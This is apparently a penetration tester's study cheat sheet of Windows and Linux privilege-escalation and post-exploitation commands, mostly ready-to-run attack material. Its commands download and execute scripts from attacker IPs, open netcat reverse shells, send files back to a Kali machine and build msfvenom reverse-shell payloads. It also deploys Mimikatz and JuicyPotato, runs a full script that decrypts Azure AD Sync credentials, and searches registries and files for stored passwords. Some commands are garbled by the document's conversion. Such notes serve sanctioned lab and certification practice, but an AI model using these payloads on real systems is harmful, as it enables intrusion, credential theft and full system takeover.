-   [[https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65]{.underline}](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)

-   [[https://techmonger.github.io/3/linux-windows-ftp/]{.underline}](https://techmonger.github.io/3/linux-windows-ftp/)

-   sudo impacket-smbserver -smb2support test . -\> attacker machine

-   copy \\192.168.119.161\\test\\winPEASx86.exe winPEASx86.exe -\>
    > victim machine

-   copy \\\\192.168.119.161:4444\\test\\winPEASx86.exe winPEASx86.exe

**From linux target to kali machine**

nc -lvp 4444 \> sitebackup2.zip \# kali machine

nc 192.168.45.231 4444 -w 3 \< sitebackup1.zip \# on victim machine

### To transfer the zip file from TARGET WINDOWS TO YOUR KALI you can use a smbserver.

copy 20240723115204_BloodHound.zip \\\\10.10.14.70\\kali

### To run the program in kali from windows machine

-   Kali \> sudo impacket-smbserver -smb2support kali .

-   Windows \> net use \\\\10.10.14.26\\kali

-   Windows \> cd \\\\10.10.14.26\\kali

-   Windows \> .\\winPEASx64.exe cmd fast \> sauna_winpeas_fast

# **Powershell :** 

## **Powershell check environment**

Check powershell running on system 64 or 32

-   \[Environment\]::Is64BitProcess

## **Command powershell to get reverse shell on cmdasp.apsx :** 

-   powershell.exe \"IEX(New-Object
    > Net.WebClient).downloadString(\'[[http://192.168.45.217/Invoke-PowerShellTcp.ps1]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)\')\"

-   powershell iex (New-Object
    > Net.WebClient).DownloadString(\'http://192.168.1.3/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp
    > -Reverse -IPAddress 192.168.1.3 -Port 4444

-   

Add at end of line Invoke-PowerShellTcp -Reverse -IPAddress
192.168.119.161 -Port 4444

-   powershell.exe \"IEX(New-Object
    > Net.WebClient).downloadString(\'[[http://192.168.119.180:8000/41020.exe]{.underline}](http://192.168.119.180:8000/41020.exe)\')\"

```{=html}
<!-- -->
```
-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://[[192.168.119.153]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)/Invoke-Mimikatz.ps1\',
    > \'c:\\Users\\Invoke-mimikittenz.ps1\')\"

```{=html}
<!-- -->
```
-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://175.12.80.10:8000/mimikatz.exe\',
    > \'c:\\temp\\mimikatz.exe\')\"

```{=html}
<!-- -->
```
-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://192.168.119.180/nc.exe\',
    > \'c:\\Users\\Public\\Downloads\\nc.exe\')\"

```{=html}
<!-- -->
```
-   C:\\Windows\\sysnative\\WindowsPowershell\\v1.0\\powershell.exe iex
    > (New-Object
    > Net.WebClient).DownloadString(\'http://192.168.119.180/Invoke-MS16032.ps1\');
    > Invoke-MS16032 -Command \'C:\\Users\\Public\\Downloads\\nc.exe -e
    > C:\\Windows\\Sytem32\\cmd.exe 192.168.119.180 4444\'

```{=html}
<!-- -->
```
-   C:\\Windows\\sysnative\\WindowsPowershell\\v1.0\\powershell.exe iex
    > (New-Object
    > Net.WebClient).DownloadString(\'[[http://192.168.119.180/Invoke-MS16032.ps1]{.underline}](http://192.168.119.180/Invoke-MS16032.ps1)\')"
    > -bypass executionpolicy

```{=html}
<!-- -->
```
-   Refrence
    > [[https://vostdev.wordpress.com/2021/02/06/htb-optimum-walk-through/]{.underline}](https://vostdev.wordpress.com/2021/02/06/htb-optimum-walk-through/)

```{=html}
<!-- -->
```
-   IEX(New-Object
    > Net.WebClient).downloadstring(\'http://192.168.119.180/Invoke-MS16032.ps1\');
    > Invoke-MS16032 -Command \'C:\\Users\\Public\\Downloads\\nc.exe -e
    > C:\\Windows\\Sytem32\\cmd.exe 192.168.119.180 443\'

## **POWERSHELL TO RUNNING MIMIKATZ:**

-   [[https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/]{.underline}](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)

```{=html}
<!-- -->
```
-   [[https://theitbros.com/managing-windows-defender-using-powershell/]{.underline}](https://theitbros.com/managing-windows-defender-using-powershell/)

-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://[[192.168.119.153]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)/Invoke-Obfuscation.zip\',
    > \'c:\\Users\\Invoke-Obfuscation.zip\')\"

```{=html}
<!-- -->
```
-   Expand-Archive -Path c:\\Users\\Invoke-Obfuscation.zip
    > -DestinationPath c:\\Users\\Invoke-Obfuscation -Verbose

```{=html}
<!-- -->
```
-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://[[192.168.119.153]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)/Invoke-MassMimikatz.ps1\',
    > \'c:\\Users\\Invoke-MassMimikatz.ps1\')\"

```{=html}
<!-- -->
```
-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://[[192.168.119.153]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)/Invoke-Mimikatz.ps1\',
    > \'c:\\Users\\Invoke-Mimikatz.ps1\')\" -bypass executionpolicy

-   powershell -c \"(new-object
    > System.Net.WebClient).DownloadFile(\'http://[[192.168.119.153]{.underline}](http://192.168.119.161/Invoke-PowerShellTcp.ps1)/Invoke-Obfuscation.psd1\',
    > \'c:\\Users\\Invoke-Obfuscation.psd1\')\"

## **Powershell to download :**

-   powershell.exe \"IEX(New-Object
    > Net.WebClient).downloadString(\'https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1\')\"

## **Powershell to PE :**

-   Install sherlock ps1 github And run : powershell \"IEX(New-Object
    > Net.WebClient).downloadString(\'http://192.168.119.180[[/Sherlock.ps1]{.underline}](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1)\');
    > Find-AllVulns"

# **Windows Privileges Escalation** 

## **Enumeration**

> OS version, installed patch information
>
> systeminfo
>
> Hostname
>
> hostname
>
> Current username
>
> whoami
>
> echo %username%
>
> If
> [[whoami.exe]{.underline}](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
> is not available, upload the whoami.exe from
> /usr/share/windows-resources/binaries/whoami.exe to target system and
> run it.
>
> List open connection
>
> netstat -anto
>
> Display all local users
>
> net user
>
> Windows firewall status
>
> netsh firewall show state
>
> Routing table rules
>
> route print
>
> List of running process
>
> tasklist /svc
>
> List all the Services
>
> net start
>
> File Permission
>
> cacls \<file name\>
>
> icacls \<file name\>
>
> Note: icacls is replacement of cacls,
>
> \* icacls (Windows Vista +)
>
> \* cacls (Windows XP)

## Automated Tools

-   [[WinPEAS]{.underline}](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

-   [[Windows Exploit
    > Suggester]{.underline}](https://github.com/bitsadmin/wesng)

-   [[BeRoot]{.underline}](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)

-   [[Seatbelt]{.underline}](https://github.com/GhostPack/Seatbelt)

-   [[WindowsEnum]{.underline}](https://github.com/absolomb/WindowsEnum)

-   [[JAWS]{.underline}](https://github.com/411Hall/JAWS)

-   [[SharpUp]{.underline}](https://github.com/GhostPack/SharpUp)

-   [[Powerup]{.underline}](https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/privesc/PowerUp.ps1)

We will also use
[[accesschk]{.underline}](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
utilities of Microsoft sysinternal suite for manual verification.

According to my experience, WinPEAS gives more comprehensive results. We
will be using WinPEAS for demonstration purposes. You can use any of the
tools. To get started, all you need is to upload and run these scripts
on the target machine. There are various ways to upload these scripts to
the target system. Explaining all in this blog is not feasible. A simple
google search will give you a way to do that. 😉

## **Credentials Hunting :** 

Extract password from iispol

-   .\\appcmd.exe list apppool

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image18.png){width="6.5in"
height="1.4027777777777777in"}

Then

-   .\\appcmd.exe list apppool \"pportal\" /text:\*

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image24.png){width="3.1354166666666665in"
height="1.125in"}

vaultcmd /listcreds:\"Windows Credentials\" /all

PS C:\\\> (Get-PSReadlineOption).HistorySavePath

C:\\Users\\adrian\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

Get-ChildItem -Path C:\\ -Include \*.kdbx -File -Recurse -ErrorAction
SilentlyContinue

Get-ChildItem -Path C:\\xampp -Include \*.txt,\*.ini -File -Recurse
-ErrorAction SilentlyContinue

type C:\\xampp\\passwords.txt

Get-ChildItem -Path C:\\Users\\dave\\ -Include
\*.txt,\*.pdf,\*.xls,\*.xlsx,\*.doc,\*.docx -File -Recurse -ErrorAction
SilentlyContinue

cat Desktop\\asdf.txt

REG QUERY HKLM /F \"password\" /t REG_SZ /S /K

REG QUERY HKCU /F \"password\" /t REG_SZ /S /K

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\Currentversion\\Winlogon\" \# Windows Autologin

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\Currentversion\\Winlogon\" 2\>nul \| findstr \"DefaultUserName
DefaultDomainName DefaultPassword\"

reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" \# SNMP
parameters

reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" \# Putty
clear text proxy credentials

reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" \# VNC credentials

reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s

-   dir /s/b C:\\\*.zip

```{=html}
<!-- -->
```
-   dir /s/b \\\*.doc

## **Service Binary Hijacking**

Get-CimInstance -ClassName win32_service \| Select Name,State,PathName
\| Where-Object {\$\_.State -like \'Running\'}

## **Service DLL Hijacking**

Get-CimInstance -ClassName win32_service \| Select Name,State,PathName
\| Where-Object {\$\_.State -like \'Running\'}

icacls .\\Documents\\BetaServ.exe

## **Unquoted Service Paths**

Get-CimInstance -ClassName win32_service \| Select Name,State,PathName

## **Scheduled Tasks**

schtasks /query /fo LIST /v

icacls C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe

## **PowerShell History :** 

cd \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\

## LAPS

-   Get-ADComputer DC01 -property \'ms-mcs-admpwd\'

-   [[https://github.com/n00py/LAPSDumper]{.underline}](https://github.com/n00py/LAPSDumper)

## Extract SAM and SYSTEM

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image35.png){width="6.5in"
height="4.277777777777778in"}

## **Service**

[[Microsoft Windows service or NT
service]{.underline}](https://en.wikipedia.org/wiki/Windows_service) is
non-GUI software that runs in the background. It automatically starts
when the system boots. Service running with administrator or system
privilege with incorrect file permission might lead to privilege
escalation.

Check what all active/inactive services present on system.

sc queryex type= service state= all

Check permissions of all services

accesschk.exe /accepteula -uwcqv \<current user name\> \*

## Insecure Write Permission on Folder

Suppose you find any service running on the target with higher privilege
and write permission on its executable binary. By replacing the service
executable with a malicious executable, it is possible to gain higher
privilege.

Check if any services are running with higher privilege:

sc qc \<service name\>

![high privilege
check](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image14.png){width="6.5in"
height="2.3055555555555554in"}

demosvc3 service is running as
[[LocalSystem]{.underline}](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account)
privilege. LocalSystem account is a wholly trusted account, and it has
extensive privilege on the local system.

Automated scan result shows that, Everyone has Full Access.\
![Automated
scan](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image17.png){width="6.5in"
height="1.1111111111111112in"}

Manually you can check permissions using icacls/cacls:\
![manual
scan](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image6.png){width="6.5in"
height="0.7916666666666666in"}

It shows everyone has Full permission. Let's generate demoservice3.exe
using msfvenom and replace it with the original one.

msfvenom -p windows/exec CMD=\"net localgroup administrators test /add\"
-f exe-service -o demo3service.exe

The generation of the above shellcode demonstrates adding a user "test"
under the Administrators group. The switch -f stands for the file type
exe-service and -o for the output of the file along with the filename
Unquoted.exe.

net stop demosvc3

net start demosvc3

Upon restarting this service, test users added to the Administrators
group.

![Test users in Administrators
group](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image2.png){width="6.5in"
height="5.708333333333333in"}

## Insecure write permission on config file

If you have write permission on the service configuration file, you can
change the service binary path to a malicious executable.

Check if any services are running with higher privilege:

sc qc \<service name\>

![Privilege status
check](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image15.png){width="6.5in"
height="2.5in"}\
demosvc1 service is also running as LocalSystem privilege.

Check if test user has access to modify service configuration.

accesschk.exe /accepteula -uwcqv \<current username\> \<service name\>

![test user
access](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image1.png){width="6.5in"
height="1.6388888888888888in"}

It says that test user has full access to this service.

Generate executable shell and transfer this into the target system

msfvenom -p windows/shell_reverse_tcp LHOST=\<Your system IP\>
LPORT=\<Your system port\> -f exe \> reverse.exe

![Transfer of executable
shell](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image27.png){width="6.5in"
height="2.388888888888889in"}

Use
[[sc]{.underline}](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create)
command to change the binpath of vulnerable service.

sc config demosvc1 binpath=\"c:userstestreverse.exe\"

Restart the service.

net stop demosvc1

net start demosvc1

![service
restart](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image11.png){width="5.777777777777778in"
height="3.75in"}

Start the listener on mentioned port. Bingo, Got NT AuthoritySystem
access.

![NT AuthoritySystem
access](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image3.png){width="6.5in"
height="2.763888888888889in"}

## **Unquoted Service Path**

Any service executable whose path contains space and is not enclosed in
the quote is vulnerable to this attack. E.g. C:Program FilesUnquoted
Pathuqsp.exe

Automated scan results show that the service "demosvc" is vulnerable to
unquoted service path vulnerability.\
![Unquoted service path
vulnerability](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image31.png){width="6.5in"
height="3.125in"}

You can check manually using sc command:

sc qc \<service name\>

![manual scan image
2](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image26.png){width="6.013888888888889in"
height="2.75in"}\
In this case, the path of service executable is C:Program FilesUnquoted
Pathuqsp.exe. It contains blank space and is not wrapped in a quote.
When SCM(Service Control Manager) starts this service, it will look at
the following paths in order, and it will run first exe that it will
find:

C:Program.exe

C:Program FilesUnquoted.exe

C:Program FilesUnquoted Pathuqsp.exe

Check permission on installed service folder.

accesschk.exe /accepteula -uwdq \"C:Program Files\"

If we have write permission in "C" or "Program Files" folder, then we
can generate our shellcode with the name ("Program.exe" or
"Unquoted.exe") and add that in the required folders.

msfvenom -p windows/exec CMD=\"net localgroup administrators test /add\"
-f exe-service -o Unquoted.exe

Place the file "Unquoted.exe" under the "Program Files" folder.\
![Unquoted.exe](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image30.png){width="5.819444444444445in"
height="4.361111111111111in"}

Now restart the service "demosvc" to get your shell code executed.\
![demosvc
executed](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image10.png){width="5.375in"
height="6.444444444444445in"}

The above image depicts that the user Test has been added successfully
to the Administrators group.

## **Always Elevated Install**

[[AlwaysInstallElevated]{.underline}](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
setting allows a non-privileged user to run Microsoft Windows Installer
Package (msi) with elevated privileges. Microsoft strongly discourages
this policy. Our scan report already flagged this vulnerability.\
![Vulnerability
flagged](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image7.png){width="6.5in"
height="0.6666666666666666in"}

Manually, all you need is to run below command to check the registry
policy.

reg query HKLMSOFTWAREPoliciesMicrosoftWindowsInstaller /v
AlwaysInstallElevated

reg query HKCUSOFTWAREPoliciesMicrosoftWindowsInstaller /v
AlwaysInstallElevated

Note that REG_DWORD is set to 1\
Next step is to generate a reverse shell using msfvenom of file type
msi.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<You systen IP\>
LPORT=\<Your system port\> -f msi -o kumar.msi

Transfer and run this msi file into the target system. It will give nt
authoritysystem level access.

## **Insecure Storage**

It is a good idea to check if any file contains hardcoded credentials in
cleartext. WinPEAS tries to grep user and password strings in the file
system, and it will give a list of files that contain user and password.

[[Findstr]{.underline}](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
tool can be used to check for specific strings on the target machine.

findstr /spin \"credentials\" \*.\*

Other than the file system, it is also possible that the vendor has kept
credentials in registry.

reg query HKLM /f password /t REG_SZ /s

To narrow down the result you can check for some specific registry

reg query \"HKLMSOFTWAREMicrosoftWindows NTCurrentversionWinlogon\"

reg query \"HKLMSYSTEMCurrentControlSetServicesSNMP\"

reg query \"HKCUSoftwareSimonTathamPuTTYSessions\"

reg query \"HKCUSoftwareORLWinVNC3Password

In the next blog we will look into more ways to perform privilege
escalation attack on Windows machine.

## **juice potato**

-   Check juice potato work or not with command \"Whoami /priv\". If
    > SeImpersonatePrivilege is enabled yes . you can exploit that.

-   powershell \"IEX(New-Object
    > Net.WebClient).downloadFile(\'[[http://192.168.119.161:8000/JuicyPotato.exe\',\'C:\\test\\JuicyPotato.exe]{.underline}](http://192.168.119.161:8000/JuicyPotato.exe','C:%5Ctest%5CJuicyPotato.exe)\')\"
    > -bypass executionpolicy

-   Create this script to show clsid :

-   ![image](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image41.png){width="6.5in"
    > height="2.0694444444444446in"}

> \$ New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
> \| Out-Null \$ \$CLSID = Get-ItemProperty HKCR:\\clsid\* \|
> select-object AppID,@{N=\'CLSID\'; E={\$*.pschildname}} \|
> where-object \$ {\$*.appid -ne \$null} \$foreach(\$a in

{ \$ Write-Host

}

-   or follow it
    > [[https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82]{.underline}](https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82)
    > ,
    > [[https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html]{.underline}](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html)

**.\\PrintSpoofer64.exe -i -c cmd**

**[[https://juggernaut-sec.com/seimpersonateprivilege/#Abusing_SeImpersonatePrivilege_JuciyPotatoexe]{.underline}](https://juggernaut-sec.com/seimpersonateprivilege/#Abusing_SeImpersonatePrivilege_JuciyPotatoexe)**

## SeLoadDriverPrivilege

[[https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print\--system]{.underline}](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system)

## SeBackUpPrivilege

https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup

## 

## 

## SeImpersonatePrivilege 

If **SeImpersonatePrivilege is enabled yes can explicit that**

powershell \"IEX(New-Object
Net.WebClient).downloadFile(\'http://192.168.119.161:8000/JuicyPotato.exe\',\'C:\\test\\JuicyPotato.exe\')\"
-bypass executionpolicy

Create this script to show clsid

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT \|
Out-Null

\$CLSID = Get-ItemProperty HKCR:\\clsid\\\* \| select-object
AppID,@{N=\'CLSID\'; E={\$\_.pschildname}} \| where-object

{\$\_.appid -ne \$null}

foreach(\$a in \$CLSID)

{

Write-Host \$a.CLSID

}

Then upload

powershell \"IEX(New-Object
Net.WebClient).downloadFile(\'http://192.168.119.161:8000/GetCLSID1.ps1\',\'C:\\test\\GetCLSID.ps1\')\"
-bypass executionpolicy

Then upload netcat

powershell \"IEX(New-Object
Net.WebClient).downloadFile(\'http://192.168.119.161:8000/nc64.exe\',\'C:\\test\\nc64.exe\')\"
-bypass executionpolicy

Create priv.bat to reverse shell :

C:\\Users\\Public\\nc64.exe -e C:\\windows\\system32\\cmd.exe
192.168.119.161 9003

Upload priv.bat to reverse shell

powershell \"IEX(New-Object
Net.WebClient).downloadFile(\'http://192.168.119.161:8000/priv.bat\',\'C:\\test\\priv.bat\')\"
-bypass executionpolicy

powershell \"IEX(New-Object
Net.WebClient).downloadFile(\'http://192.168.119.161:8000/priv.bat\',\'C:\\test\\priv.bat\')\"
-bypass executionpolicy

JuicyPotato.exe -l 1337 -p C:\\Users\\Public\\Downloads\\shell.exe -t \*
-c

{687e55ca-6621--4c41-b9f1-c0eddc94bb05}

juicypotato.exe -p C:\\tmp\\shell.exe -l 1337 -t \* -c
\'{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}\' -\> another writeup
juicepotato -\>
[[https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82]{.underline}](https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82)

./JuicyPotato.exe -p C:\\test\\priv.bat -l 9003 -t \* -c
\'{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}\' -\>
[[https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html]{.underline}](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html)

**Osp windows pE:**

[[https://payatu.com/blog/suraj/Windows-Privilege-Escalation-Guide]{.underline}](https://payatu.com/blog/suraj/Windows-Privilege-Escalation-Guide)

[[https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html]{.underline}](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html)

## Windows XP SP0/SP1 Privilege Escalation to System

[[https://sohvaxus.github.io/content/winxp-sp1-privesc.html]{.underline}](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)

Always check permission of all services using command below :

*accesschk.exe /accepteula -uwcqv \"Authenticated Users\" \**

Then check service running on higher privilege or not with command below
:

Sc qc \<service_name\>

## 

## DLL Hijacking

## Autorun

#For checking, it will display some information with file-location

reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

#Check the location is writable

accesschk.exe \\accepteula -wvu \"\<path\>\" #returns FILE_ALL_ACCESS

#Replace the executable with the reverseshell and we need to wait till
Admin logins,

## AlwaysInstallElevated

#For checking, it should return 1 or Ox1

reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v
AlwaysInstallElevated

reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v
AlwaysInstallElevated

#Creating a reverseshell in msi format

msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<IP\> LPORT=\<port\>
\--platform windows -f m

#Execute and get shell

msiexec /quiet /qn /i reverse.msi

## Schedules Tasks

schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup
any interesting one

#Permission check - Writable means exploitable!

icalcs \"path\"

#Wait till the scheduled task in executed, then we\'ll get a shell

## Startup Apps

C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp
#Startup applications can be

#Check writable permissions and transfer

#The only catch here is the system needs to be restarted

## Insecure GUI apps

#Check the applications that are running from \"TaskManager\" and obtain
list of application

#Open that particular application, using \"open\" feature enter the
following

file://c:/windows/system32/cmd.exe

## Passwords

### Sensitive files

%SYSTEMROOT%\\repair\\SAM

%SYSTEMROOT%\\System32\\config\\RegBack\\SAM

%SYSTEMROOT%\\System32\\config\\SAM

%SYSTEMROOT%\\repair\\system

%SYSTEMROOT%\\System32\\config\\SYSTEM

%SYSTEMROOT%\\System32\\config\\RegBack\\system

findstr /si password \*.txt

findstr /si password \*.xml

findstr /si password \*.ini

Findstr /si password \*.config

findstr /si pass/pwd \*.ini

dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*

in all files

findstr /spin \"password\" \*.\*

findstr /spin \"password\" \*.\*

### Config files

c:\\sysprep.inf

c:\\sysprep\\sysprep.xml

c:\\unattend.xml

%WINDIR%\\Panther\\Unattend\\Unattended.xml

%WINDIR%\\Panther\\Unattended.xml

dir /b /s unattend.xml

dir /b /s web.config

dir /b /s sysprep.inf

dir /b /s sysprep.xml

dir /b /s \*pass\*

dir c:\\\*vnc.ini /s /b

dir c:\\\*ultravnc.ini /s /b

dir c:\\ /s /b \| findstr /si \*vnc.ini

### Registry

reg query HKLM /f password /t REG_SZ /s

reg query \"HKLM\\Software\\Microsoft\\Windows
NT\\CurrentVersion\\winlogon\"

##VNC

reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"

reg query \"HKCU\\Software\\TightVNC\\Server\"

\### Windows autologin

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\Currentversion\\Winlogon\"

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\Currentversion\\Winlogon\" 2\>nul \| findstr \"D

\### SNMP Paramters

reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"

\### Putty

reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"

\### Search for password in registry

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s

### RunAs - Savedcreds

cmdkey /list #Displays stored credentials, looks for any optential users

#Transfer the reverseshell

runas /savecred /user:admin C:\\Temp\\reverse.exe

## Get-MSOLCredentials via Azure admins PE port (1443)

[[https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html]{.underline}](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)

[[https://blog.raw.pm/en/HackTheBox-Monteverde-write-up/]{.underline}](https://blog.raw.pm/en/HackTheBox-Monteverde-write-up/)

iex(new-object
net.webclient).downloadstring(\'[[http://10.10.14.126:8000/Get-MSOLCredentials.ps1]{.underline}](http://10.10.14.126:8000/Get-MSOLCredentials.ps1)\')

\$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
\"Server=127.0.0.1;Database=ADSync;Integrated Security=True\"

\$client.Open()

\$cmd = \$client.CreateCommand()

\$cmd.CommandText = \"SELECT keyset_id, instance_id, entropy FROM
mms_server_configuration\"

\$reader = \$cmd.ExecuteReader()

\$reader.Read() \| Out-Null

\$key_id = \$reader.GetInt32(0)

\$instance_id = \$reader.GetGuid(1)

\$entropy = \$reader.GetGuid(2)

\$reader.Close()

\$cmd = \$client.CreateCommand()

\$cmd.CommandText = \"SELECT private_configuration_xml,
encrypted_configuration FROM mms_management_agent WHERE ma_type =
\'AD\'\"

\$reader = \$cmd.ExecuteReader()

\$reader.Read() \| Out-Null

\$config = \$reader.GetString(0)

\$crypted = \$reader.GetString(1)

\$reader.Close()

add-type -path \'C:\\Program Files\\Microsoft Azure AD
Sync\\Bin\\mcrypt.dll\'

\$km = New-Object -TypeName
Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager

\$km.LoadKeySet(\$entropy, \$instance_id, \$key_id)

\$key = \$null

\$km.GetActiveCredentialKey(\[ref\]\$key)

\$key2 = \$null

\$km.GetKey(1, \[ref\]\$key2)

\$decrypted = \$null

\$key2.DecryptBase64ToString(\$crypted, \[ref\]\$decrypted)

\$domain = select-xml -Content \$config -XPath
\"//parameter\[@name=\'forest-login-domain\'\]\" \| select \@{Name =
\'Domain\'; Expression = {\$\_.node.InnerXML}}

\$username = select-xml -Content \$config -XPath
\"//parameter\[@name=\'forest-login-user\'\]\" \| select \@{Name =
\'Username\'; Expression = {\$\_.node.InnerXML}}

\$password = select-xml -Content \$decrypted -XPath \"//attribute\" \|
select \@{Name = \'Password\'; Expression = {\$\_.node.InnerXML}}

Write-Host (\"Domain: \" + \$domain.Domain)

Write-Host (\"Username: \" + \$username.Username)

Write-Host (\"Password: \" + \$password.Password)

## Grabbing root : 

Get-Childitem -Path C:\\Users -Include local.txt -Recurse

Dir /s /b local.xt

## AD Recycle Bin group

Get-ADObject -ldapFilter:\"(msDS-LastKnownRDN=\*)\"
-IncludeDeletedObjects

Get-ADObject -filter { SAMAccountName -eq \"TempAdmin\" }
-includeDeletedObjects -property \*

## ADCS Exploitation : 

abusing ADCS

[[https://0xdf.gitlab.io/2023/06/17/htb-escape.html]{.underline}](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)

[[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation]{.underline}](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M
adcs

Download Certify.exe or u can use certipy-ad

./Certify.exe find /vulnerable

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image37.png){width="6.088542213473316in"
height="5.466022528433946in"}

Then

.\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA
/template:UserAuthentication /altname:administrator

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image34.png){width="6.5in"
height="4.597222222222222in"}

# Linux Privilege Escalation

-   ## Always check backup file or password hunting

> ![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image9.png){width="6.291666666666667in"
> height="1.1979166666666667in"}

-   ## Check sudo version is vulnerable or not [[https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh]{.underline}](https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh) 

-   ## Check SUID or SGID [[https://juggernaut-sec.com/suid-sgid-lpe/#Hunting_for_SUID_SGID_Binaries\_%E2%80%93_Manual_Method]{.underline}](https://juggernaut-sec.com/suid-sgid-lpe/#Hunting_for_SUID_SGID_Binaries_%E2%80%93_Manual_Method) 

